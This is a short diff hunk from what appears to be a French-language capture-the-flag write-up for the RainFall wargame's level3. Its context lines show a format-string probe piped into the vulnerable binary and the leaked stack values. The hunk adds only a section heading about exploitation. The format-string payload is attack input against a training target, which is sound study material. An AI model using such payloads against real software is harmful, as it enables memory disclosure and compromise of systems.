@@ -86,3 +86,6 @@ Je recupere l'adresse 00000200,
 level3@RainFall:~$ echo "\x00\x02\x00\x00_%08x.%08x|%s|" | ./level3 
 \x00\x02\x00\x00_00000200.b7fd1ac0|��$�|
 
+	3.4.1 Exploitation - similar to common buffer overflows
+
+
